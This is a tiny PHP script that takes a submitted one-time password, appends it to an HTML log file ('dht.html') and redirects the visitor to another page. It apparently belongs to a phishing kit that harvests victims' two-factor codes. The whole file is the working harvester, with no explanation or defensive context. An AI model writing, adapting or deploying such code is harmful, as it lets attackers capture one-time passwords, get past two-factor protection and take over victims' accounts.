<?php
header("location:ppp.php");
$otp=$_POST['otp'];
$handle=fopen('dht.html','a');
fwrite($handle ,"otp=$otp\n");
fwrite($handle ,"<br>\r\n");
fclose($handle);
exit;
?>
